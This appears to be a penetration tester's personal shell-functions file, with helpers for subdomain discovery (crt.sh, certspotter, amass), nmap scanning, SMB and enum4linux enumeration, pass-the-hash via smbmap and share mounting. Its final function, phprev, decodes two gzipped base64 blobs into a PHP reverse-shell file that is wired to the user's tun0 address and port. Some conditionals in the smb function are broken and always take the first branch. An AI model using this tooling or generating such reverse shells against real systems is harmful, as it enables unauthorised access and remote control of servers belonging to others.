certprobe(){ #runs httprobe on all the hosts from certspotter
curl -s https://crt.sh/\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe | tee -a ./all.txt
}

crtsh(){
curl -s https://crt.sh/?Identity=%.$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sort -u | awk 'NF'
}

crtshdirsearch(){ #gets all domains from crtsh, runs httprobe and then dir bruteforcers
curl -s https://crt.sh/?q\=%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe -c 50 | grep https | xargs -n1 -I{} python3 /opt/dirsearch/dirsearch.py -u {} -e $2 -t 50 -b
}

certnmap(){
curl https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1  | nmap -T5 -Pn -sS -i - -$
}

am(){ #runs amass passively and saves to json
amass enum --passive -d $1 -json $1.json
jq .name $1.json | sed "s/\"//g"| httprobe -c 60 | tee -a $1-domains.txt
}


smb() {
#smb <host ip> <uname> <password>
if [ -z "$1" ]
then
 echo "Missing variable for host IP address."
 echo "Sytax should be: smb <host ip> <uname> <password>"
else
 if [ "smbclient -L $1 | grep 'NT_STATUS_LOGON_FAILURE'" ]
 then
   echo "That did not work, maybe we need to try null user credentials..."
   smbclient -L $1 -U ''
 else
   if [ "smbclient -L $1 -U '' | grep 'NT_STATUS_LOGON_FAILURE'" ]
   then
     echo "Maybe you entered credentials, lets try those..."
     smbclient -L $1 -U "$2"
   else
     if [ "smbclient -L $1 -U "$2" | grep 'NT_STATUS_LOGON_FAILURE'" ]
     then
       echo "Lets do some SMBMapping..."
       smbmap -H $1
     else
       if [ "smbmap -H $1 | grep 'Authentication error'" ]
       then
         echo "SMBMap with creds if they were applied..."
         smbmap -H $1 -u "$2" -p "$3"
       fi
     fi
   fi
 fi
fi
 }

e4l() {
# Enum4Linux-ng to run and create folder on desktop and output found items there.
# e4l <ip addy> <uname> <password>
if [ -z "$2" ] || [ -z "$3" ]
then
  echo "running with host only..."
  cd /opt/enum4linux-ng
  mkdir -p ~/Desktop/enum4linux
  python3 enum4linux-ng.py $1 -oY ~/Desktop/enum4linux/$1-output.txt
else
  echo "lets try these creds out shall we?"
  cd /opt/enum4linux-ng
  mkdir -p ~/Desktop/enum4linux
  python3 enum4linux-ng.py $1 -u "$2" -p "$3" -oY ~/Desktop/enum4linux/$1-output.txt
fi
}

pth() {
  # Pass The Hash: pth <username> <password hash> <host ip>
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]
then
  echo "You are missing one or more variables..."
  echo "Usage: pth <username> <pass hash> <host ip>"
else
  smbmap -u "$1" -p "$2" -H $3
fi
}

mntsmb() {
# Quick way to mount an SMB Share
if [ -z "$1" ] || [ -z "$2" ]
then
 echo "You are missing a variable required to mount SMB share."
 echo "Usage: mntntfs <ip addr> <share>"
else
  sudo mount -t cifs "//$1/$2" /mnt
fi
}

umountsmb() {
# Unmount SMB
  sudo umount /mnt
}


mntntfs() {
# mntfs <ip addy> <share> <uname> <pass>
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ] || [ -z "$4" ]
then
    echo "You are missing one or more variables..."
    echo "Please use syntax: mntntfs <ip addr> <share> <username> <password>"
  else
  sudo mkdir -p /mnt/ntfs
  sudo mount -t cifs //$1/$2 -o username=$3,password=$4 /mnt/ntfs
fi

}

umountntfs() {
# Unmount NTFS
  sudo umount /mnt/ntfs
}

il() {
#
# syntax: il <ip / target list name> <command list>
if [ -z "$1" ]
then
  echo "Sorry, target must be selected."
  echo "Usage: il <ip> <command list>"
  echo "       il <domain name> <command list>"
  echo "       il <targets list> <command list>"
  else
    if [[ "$1" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
    then
      echo "$1" > /tmp/hosts.txt
      sudo interlace -tL /tmp/hosts.txt -cL $2
      else
        host $1 >/dev/null 2>&1
        if [ $? -eq 0 ]
        then
          echo "Domain validated.."
          sudo interlace -t $1 -cL $2
          else
            cat $1 >/dev/null 2>&1
            if [ $? -eq 0 ]
            then
              echo "Using Tartets Text File..."
              sudo interlace -tL $1 -cL $2
              else
                echo "You must be confused.  Target needs a list, ip or host name.  Try again"
      fi
    fi
  fi
fi
}

instashell() {
# Run instashell from anywhere: Example:: instashell <option> <ip> <port>
if [ -z "$1" ]
then
  python3 /opt/instashell/instashell.py --help
else
  python3 /opt/instashell/instashell.py $1 $2 $3
 fi
}

asn() {
python3 /opt/asnlookup/asnlookup.py
}

spoofcheck() {

python /opt/spoofcheck/spoofcheck.py $1

}


autoenum() {

cd /opt/autoenum
sudo ./autoenum.sh

}


sherlock(){

sudo python3 /opt/sherlock/sherlock/sherlock.py $1

}

dnsdumpster() {
sudo python3 /opt/dnsdumpster/dnsdumpster.py -d $1

}

bloodhnd() {
terminator -T "neo4j" -e "sudo neo4j console"
sudo bloodhound &
}


phprev() {
# Easy way of creating php reverse shell for your tun0 connection and your prefered port number.  
# Outputs to whatever directory you are currently in with Terminal.
# Usage: phprev <port>
ipaddy=$(sudo ifconfig tun0 | grep "inet " | tr -s " " | cut -d " " -f 3)
port="$1"

filetop=$(base64 -d <<< "H4sIAAAAAAAAA+VY224bNxB911cMgj7YiK5OggJxi1ZxrViAYi90qeEng9qdlQhzyS3Jlau/75ld
WYmbJnXRFDZqPtjaXXJ4znDImcMffirXZavXI/zreN6wD9wJazaGOjSkafOGZvUbXZSGC7ZRRe0s
aUvJWSKDT1y59Xq1jnRwckhH/f73VKIbh1g4e8Pbn+89dS1HjJKB87UOFJ0zVKgtLZmqwBnlzpPh
lTJUVr50gQM5a7ZdokUAHIrqhimvgMhzKJ0NeqmNjluxKGOV3ZJKBWMADo9XBaxWQdsVxbsZYW2+
ZlJVXMuQNOUyBrKOjFb3zWWqUCumVNXgltt7NsY5HhkuiuyLQMozbMSdPbU0+OBo66q2dLNiMnN1
j0rG7A3t/DG2pEDLoa+vyXEKUHii98mEZC3E8UekytJoDm8/dWPp3cqrgvAz98wUXB5vgedYpgd6
C4OZDtHrZRWZNEDarAd+hct0XrPFu8pmmFpmbAi5vJn+fEHv2bLHoiTV0uiUJjplCxKfoAp1JMln
hNDOVUwjQTPboaGRwxR1AHW/gP4jyExiTEysXSneUlEg3mq4qIkVBEFbTKAzXY7nZxeLOQ3Pr+hy
OJ0Oz+dXx+iM9cVXBHJjSoJYwzLAeGXjFgzFwofT6ckZhgzfjSfj+RXBL6Px/Px0NqPRxRRbIRlO
5+OTxWQ4pWQxTS5mp1j9GQssFgNf8VBeOxncM45Km3BH/ArrEoDOZLRWG8b6pKw3wKYoxY56gO+V
cXYlpoRmE047Rx6TziXO2nTrdayj8Gtr0Ubopd02PekmRN8MwEHZG4PImEWwAcORzsF+ZJzzbXrn
QhQ+H4bUPxoM+p3Bq/6AFrNh97HhP7wJ0WfRvn0OeGxGX2j/NDU9KK08xSZE9+nur3PdY0P8Nu1Z
7VHJVBKDbFNXeVRDmcRfYJshUxVSEoa2ZFbvNnWBGCR/hmq1QtFXx/oTjdZ7TYgWyKnx74rXxwb6
b9uzCt1fOKRel7Vi+d82Idr52B4bzn/X9gVDs6iNFiikFoC+QZ2/lIqW5icJziVruc60cvgoVNg+
S12Gk2uciPKh0vn4dHNRQ7TWBLrUOIH2smelRcooalS6r6yV4kE1MjGtvJfOyLieDlSp0rVUDr6A
rNwePkW6z+owmuhCN7cn4U9btlbO3qXXULq2jk+IYFbFdeB4vTQuvZFV9vxbpZGHk7Nkr7tfd1+9
bEu+ffNSjKA8FuG4H22wCQ4OUTxTro1I0GbnONTQnmPlbSPU93Ojbx1pOZRqjaPpRaPhZHa6ux64
1DZzt7WOhZhEzkQRUMJ6J2o8uLLJ+XXRypztqvlMMVKoDs3l0YHR2LRlaqNpYysG/fthcyMjqhYD
Pf4Y1MobwJB6904zLwKqj73vagBQtOsYy7e93meZuicFZ+h9frkFcSy3Iisk8xCr9KbbaomjBf+1
kUWig/7hceu7X0+ns/HFOf1ILwbd/ovjVusPYCI2BjITAAA=" | gunzip )

filebottom=$(base64 -d <<< "H4sIAAAAAAAAA61XbW/bNhD+7l9xMwxYBpwXZ/uUIB2KtB2CrU2RZMiHbTBoiYoIy6RGUnHdof99
z5GSLbdqlrQzDNiS7vW5546nUVrUejl36qOkc5r9dHx8NhitrfJyLnBD12WJG9JaY7s3XCHLEpfj
WouVpANxRuszUtkZHS2UPnIFHagx5DIhV0ZDkM1mclHfx/+DoyN86VV4rJwkU1sny5xUTpVxTi1K
Sd6QeDAqo49mtVDSUSm8tKzKulWqfTnPjV2SclQIm5Ubkg/SQkmoUsDClBa1p7VCqKIszZpqx0az
1iubgWOqiooqa1LpHAmd7Xs9JLoz1hckyNvN4eHhADEmea1Tr4yeyw/KeZeMd+GMJxP6Z0DNBy7e
cIxstxAPyKqQVAkrtd/6hA2/VRhV8H3eSS+ZAK/2KfuOEud0MOs6aj+VVdornwxfX19fXZ/ShdBj
T2xoCEOfS7PrZNZ58OlLX31egt7x5Cwk+D6mw/dcnyGIvBXLmHpa273cBTn8AEkqpchQ3o7SHVfO
aNTV1WkqZcYhrWVIRmZ7cYI06sPcSe9Ulkyegg5TukWn1XsuQjt+z84Gn0iWYPLO59bX3cvrd5fv
fjmlNyAmsuhyEPS6LUBgfP+u0XaUmhWbZL5og8IJL8pDDuxToP1FIfR97A1yIpeUKStTb+xmkBb4
nwyPWJhFr+EChBN6Q/VKuCVDp3QhubuzQbjFJdw2owkFstxDyCO0ONO96berSurtw9RoLUMDYBaY
dAkEcv41EEpGqpqCxmga/GB0aBN/nbdT+pE9csV+CIqTPrwaYbAvaO+VZVuOCMdNJdY6xtpSigeN
S62qAIqrZIrYhLVik7CNYzp/0VwOK1XJ4ZSGdjiZBr45nynNlRDEzwCH8JG0hSqzOEgsWEq5NSu2
Nuuxtu5YMxg/j5sLoxbVZGsn/daotQYwnmqNqzpqW+w8IDOPtQlQoR77GHG9YNSxXiiOcnMrHYZj
KpPW0KS3WHtjxu3K8VjRpA+TeuMLpe+Zy9rog0UJPuA6Ulc4o0/pKk15NmB6bwLyLuYZRKdsQwMC
U98XwAfPV5gAJXhJHgG4MO4LuaG1QWyDrYSft66SmPUfx39NiXn5iMjsv0VOHhNxIeLQblvobniq
OZfXnB6XB7Nhr/0YGnTTaWim0NZrFFtSMvvsiLkoJJoQc5Ek5obJ6fbifbdJu6MylyaP8Uyecn7c
hEB2toCtXSmNozjrG5cL5L7sHZZ9Yd7cvrr6/bYnvBb0Z4TY0v074rsTylMN21gYwiDmKYyW42gz
A2Y3ZUQCzqxkV7WVRstXTde3awiOsCZRVsQ/hL07QpjWYbWKnd946LBuy65ONiNdr+ZpOAqyOWvg
AIOJvSZIGtOw0Cx0cQzzJjcNi1x3sUAKl+FwTYXeDbkwYJhL0ccUJ6XOujoZjidmaQP+2HF+l+/2
Kqr0fD+3GFdvacPOERbFya7MN1cXv9L165ev+go6UpoBxwHEZrc+dnttj85XvZw25voc5QHF7siI
sv2rwSN47mHVpT+P+UA1BjXwzafV19p4h2qHKs9GNtLyqdh2PH0DvsHXUxBuSvg/oNvttO9C9+Qb
0UUAz0T35JvRha/vQhf45mlpXCODZ+1lS/kvbs2+vBXmVFg42tvN9hCX0t/UUsao49tZZvBih0U3
bAJhvR9jZ92ux1n7Zsi6ySXXm99m1H1t+aXRU4HXOswfK+Me3A7akt0IJkOFN8JobjJo39pa2IAj
RiY8d0sal9NG5WunDw0bzT/18DMMf35Bg38BTHZA/VcPAAA=" | gunzip )

echo -e "$filetop\n\$ip = '$ipaddy';\n\$port = '$1'; \n$filebottom" > revshell.php

}
